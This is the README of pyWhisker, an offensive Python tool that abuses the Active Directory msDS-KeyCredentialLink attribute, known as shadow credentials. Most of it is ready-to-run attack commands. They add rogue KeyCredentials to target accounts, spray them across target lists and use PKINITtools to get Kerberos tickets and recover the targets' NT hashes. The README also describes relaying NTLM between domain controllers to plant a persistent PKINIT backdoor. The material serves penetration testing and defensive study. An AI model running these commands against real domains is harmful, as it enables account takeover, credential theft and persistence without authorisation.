# pyWhisker

pyWhisker is a Python equivalent of the original [Whisker](https://github.com/eladshamir/Whisker) made by [Elad Shamir](https://twitter.com/elad_shamir) and written in C#. This tool allows users to manipulate the `msDS-KeyCredentialLink` attribute of a target user/computer to obtain full control over that object.
It's based on [Impacket](https://github.com/SecureAuthCorp/impacket) and on a Python equivalent of [Michael Grafnetter's](https://twitter.com/MGrafnetter) [DSInternals](https://github.com/MichaelGrafnetter/DSInternals) called [PyDSInternals](https://github.com/p0dalirius/pydsinternals) made by [podalirius](https://twitter.com/podalirius_).
This tool, along with [Dirk-jan's](https://twitter.com/_dirkjan) [PKINITtools](https://github.com/dirkjanm/PKINITtools) allow for a complete primitive exploitation on UNIX-based systems only.

**Pre-requisites** for this attack are as follows:
 1. The target Domain Functional Level must be **Windows Server 2016** or above.
 2. The target domain must have at least one Domain Controller running Windows Server 2016 or above.
 3. The Domain Controller to use during the attack must have its own certificate and keys (this means either the organization must have AD CS, or a PKI, a CA or something alike).
 4. The attacker must have control over an account able to write the `msDs-KeyCredentialLink` attribute of the target user or computer account.

Why some pre-reqs?
 - Pre-reqs 1 and 2 because the PKINIT features were introduced with Windows Server 2016.
 - Pre-req 3 because the DC needs its own certificate and keys for the session key exchange during the `AS_REQ <-> AS_REP` transaction.

A `KRB-ERROR (16) : KDC_ERR_PADATA_TYPE_NOSUPP` will be raised if pre-req 3 is not met.

# Usage

pyWhisker can be used to operate various actions on the msDs-KeyCredentialLink attribute of a target:
- [list](https://github.com/ShutdownRepo/pywhisker#list-and-get-info): list all current KeyCredentials ID and creation time
- [add](https://github.com/ShutdownRepo/pywhisker#add-new-values): add a new KeyCredential to the `msDs-KeyCredentialLink`
- [spray](https://github.com/ShutdownRepo/pywhisker#spray-new-values): spray adding a new KeyCredential to the `msDs-KeyCredentialLink`
- [remove](https://github.com/ShutdownRepo/pywhisker#clear-and-remove): remove a KeyCredential from the `msDs-KeyCredentialLink`
- [clear](https://github.com/ShutdownRepo/pywhisker#clear-and-remove): remove all KeyCredentials from the `msDs-KeyCredentialLink`
- [info](https://github.com/ShutdownRepo/pywhisker#list-and-get-info): print all info contained in a KeyCredential structure
- [export](https://github.com/ShutdownRepo/pywhisker#import-and-export): export all KeyCredentials from the `msDs-KeyCredentialLink` in JSON
- [import](https://github.com/ShutdownRepo/pywhisker#import-and-export): overwrite the `msDs-KeyCredentialLink` with KeyCredentials from a JSON file

pyWhisker supports the following authentications:
 - (NTLM) Cleartext password
 - (NTLM) [Pass-the-hash](https://www.thehacker.recipes/active-directory-domain-services/movement/lm-and-ntlm/pass-the-hash)
 - (Kerberos) Cleartext password
 - (Kerberos) [Pass-the-key](https://www.thehacker.recipes/active-directory-domain-services/movement/kerberos/pass-the-key) / [Overpass-the-hash](https://www.thehacker.recipes/active-directory-domain-services/movement/kerberos/overpass-the-hash)
 - (Kerberos) [Pass-the-cache](https://www.thehacker.recipes/active-directory-domain-services/movement/kerberos/pass-the-cache) (type of [Pass-the-ticket](https://www.thehacker.recipes/active-directory-domain-services/movement/kerberos/pass-the-ticket))

Among other things, pyWhisker supports multi-level verbosity, just append `-v`, `-vv`, ... to the command :)

pyWhisker can also do cross-domain, see the `-td/--target-domain` argument.

```

Below are examples and screenshots of what pyWhisker can do.

## List and get info

pyWhisker has the ability to list existing KeyCredentials. In addition to that, it can unfold the whole structure to show every piece of information that object contains (including the RSA public key parameters).

```shell
python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "list"
python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "info" --device-id 6419739b-ff90-f5c7-0737-1331daeb7db6
```

![](./.assets/list_info.png)

## Clear and remove

pyWhisker has the ability to remove specific values or clear the whole attribute.

```shell
python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "remove" --device-id a8ce856e-9b58-61f9-8fd3-b079689eb46e
```

![](./.assets/remove.png)

```shell
python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "clear"
```

![](./.assets/clear.png)

## Add new values

pyWhisker has the ability to generate RSA keys, a X509 certificate, a KeyCredential structure, and to write the necessary information as new values of the `msDs-KeyCredentialLink` attribute. The certificate can be exported in a PFX format (#PKCS12, certificate + private key protected with a password) or in a PEM format (PEM certificate, PEM private key, no password needed).

### Example with the PFX format

```shell
python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "add" --filename test1
```

![](./.assets/add_pfx.png)

Once the values are generated and added by pyWhisker, a TGT can be request with [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py). The NT hash can then be recovered with [getnthash.py](https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py).

```shell
python3 PKINITtools/gettgtpkinit.py -cert-pfx test1.pfx -pfx-pass xl6RyLBLqdhBlCTHJF3R domain.local/user2 user2.ccache
python3 PKINITtools/getnthash.py -key f4d6738897808edd3868fa8c60f147366c41016df623de048d600d4e2f156aa9 domain.local/user2
```

![](./.assets/add_pfx_gettgtnthash.png)

### Example with the PEM format

```shell
python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "add" --filename test2 --export PEM
```

![](./.assets/add_pem.png)

Once the values are generated and added by pyWhisker, a TGT can be request with [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py). The NT hash can then be recovered with [getnthash.py](https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py).

```shell
python3 PKINITtools/gettgtpkinit.py -cert-pem test2_cert.pem -key-pem test2_priv.pem domain.local/user2 user2.ccache
python3 PKINITtools/getnthash.py -key 894fde81fb7cf87963e4bda9e9e288536a0508a1553f15fdf24731731cecad16 domain.local/user2
```

![](./.assets/add_pem_gettgtnthash.png)

## Spray new values
pyWhisker can chain multiple KeyCredentials additions, to a set of targets, i.e. spray (if the credentials used have the right permissions).

```shell
python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target-list targetlist.txt --action "spray"
```

## Import and export

KeyCredentials stored in the `msDs-KeyCredentialLink` attribute can be parsed, structured and saved as JSON.

![](./.assets/export.png)

The JSON export can then be used to restore the `msDs-KeyCredentialLink` attribute in the state it was at the time of export.

# Relayed authentication

[A Pull Request](https://github.com/fortra/impacket/pull/1249) was merged into ntlmrelayx to include pyWhisker's "adding" feature.

![](./.assets/relay.png)

# Useful knowledge

User objects can't edit their own `msDS-KeyCredentialLink` attribute. However, **computer objects can**. This means the following scenario could work: trigger an NTLM authentication from DC01, relay it to DC02, make pyWhisker edit DC01's attribute to create a Kerberos PKINIT pre-authentication backdoor on it.

![](./.assets/user_cant_self_edit.png)  

Computer objects can edit their own `msDS-KeyCredentialLink` attribute but **can only add a KeyCredential if none already exists**.

![](./.assets/computers_can_self_edit.png)

If you encounter errors, make sure there is no time skew between your attacker host and the Key Distribution Center (usually the Domain Controller). In order to avoid that error, the certificates generated by the pyWhisker tool are valid 40 years before the current date and 40 years after.

We initially planned on refactoring Impacket scripts (especially [gettgt.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getTGT.py)) to implement asymmetric PKINIT pre-authentication for Kerberos. He saved us a huge deal of headaches by writing it before us!
